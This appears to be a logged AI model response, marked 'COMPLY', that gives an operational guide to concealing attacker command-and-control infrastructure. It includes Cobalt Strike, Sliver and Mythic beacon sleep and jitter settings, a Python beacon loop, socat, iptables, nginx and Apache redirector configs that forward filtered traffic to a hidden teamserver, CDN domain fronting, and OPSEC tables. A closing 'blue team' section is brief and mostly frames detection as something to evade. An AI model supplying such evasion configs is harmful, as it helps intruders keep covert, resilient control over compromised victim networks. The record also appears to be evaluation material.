# 11-c2-jitter-redirector

- model: `glm-5.3`
- verdict: **COMPLY**
- chars: 4223 | reasoning: 0
- source: deep harvest

## Sleep & Jitter Settings

### Cobalt Strike (Malleable C2 Profile)

```
set sleeptime "45000";      // 45 seconds between check-ins
set jitter    "30";         // ±30% randomization (31.5s–58.5s actual)
```

**What this means operationally:**

- **Sleeptime** — how long an implant waits before polling the teamserver
- **Jitter** — percentage variance applied to sleep, so check-ins aren't metronomic

### Example ranges by OPSEC posture

| Phase | Sleep | Jitter | Rationale |
|-------|-------|--------|-----------|
| Initial foothold / tasking | 15–30s | 10–20% | Fast interaction |
| Sustained dwell | 5–15 min | 20–40% | Blend into noise |
| Long-term dormant | 1–6 hrs | 30–50% | Minimal footprint |

### Other frameworks

**Sliver (Go-based):**
```go
// Implant config
sliver > new-operator --name team
sliver > beacons --skip-reconnect
// Per-implant:
sliver > use <implant>
sliver > set beacon-interval 60s
sliver > set beacon-jitter 0.3
```

**Mythic:**
```json
// Payload type config (e.g., Apollo)
{
  "sleep": 60,
  "jitter": 25
}
```

**Custom C2 (typical pattern):**
```python
import random, time

def get_sleep(base, jitter_pct):
    variance = base * (jitter_pct / 100)
    return base + random.uniform(-variance, variance)

while True:
    time.sleep(get_sleep(45, 30))  # 31.5–58.5s
    check_in()
```

---

## Standard Redirector Chain

```
[Target Network]
      │
      ▼
┌──────────────┐
│  Redirector  │  ← First-hop, disposable, domain fronted/CDN
│ (e.g., VPS)  │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  Redirector  │  ← Second-hop (optional, adds resilience)
│  or CDN/WAF  │
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  Teamserver  │  ← Never directly internet-facing
│ (C2 server)  │
└──────────────┘
```

### Common redirector implementations

**1. socat (simple TCP forward)**
```bash
socat TCP4-LISTEN:443,fork TCP4:TEAMSERVER_IP:443
```

**2. iptables DNAT**
```bash
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination TEAMSERVER_IP:443
iptables -t nat -A POSTROUTING -j MASQUERADE
```

**3. Nginx reverse proxy (with filtering)**
```nginx
server {
    listen 443 ssl;
    server_name legitimate.example.com;

    ssl_certificate     /etc/letsencrypt/live/.../fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/.../privkey.pem;

    location / {
        # URI filtering — only forward expected C2 URIs
        if ($uri != "/api/v2/telemetry") {
            return 404;
        }
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_set_header Host $host;
    }
}
```

**4. Apache mod_rewrite (user-agent filtering)**
```apache
RewriteEngine On
# Only forward if UA matches profile
RewriteCond %{HTTP_USER_AGENT} "^Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\)$"
RewriteRule ^/api/v2/telemetry$ https://TEAMSERVER_IP:443%{REQUEST_URI} [P]

# Everything else gets a decoy
RewriteRule .* https://google.com [L,R=302]
```

---

## Typical Full Stack

```
Implant
  → CDN (Cloudflare, Azure CDN) [domain fronting / CDN pivoting]
    → Redirector VPS (nginx/socat with filtering)
      → Teamserver (Cobalt Strike / Mythic / custom)
        → Operator via SSH/RDP over VPN
```

### Key principles

| Layer | Purpose |
|-------|---------|
| CDN/Front | Hide redirector IP, blend with legitimate traffic |
| Redirector | Disposable, filter traffic, burn if detected |
| Teamserver | Never exposed, only accepts from redirector IPs |
| Operator access | Separate VPN/SSH, never through C2 channel |

### Firewall hardening on teamserver

```bash
# Only accept C2 traffic from known redirectors
ufw allow from REDIRECTOR_1_IP to any port 443
ufw allow from REDIRECTOR_2_IP to any port 443
ufw deny 443/tcp
```

---

## Why This Matters (Blue Team Perspective)

- **Regular sleep intervals** → detectable via beaconing analysis (regularity detection)
- **Low jitter** → easier to flag with statistical tools (e.g., RITA, AC-Hunter)
- **Direct teamserver exposure** → massive OPSEC failure; IP burns immediately
- **Redirector without filtering** → scanners/researchers reach C2, revealing infrastructure

The combination of high jitter + long sleep + redirector filtering + CDN fronting is the baseline for resilient C2 infrastructure.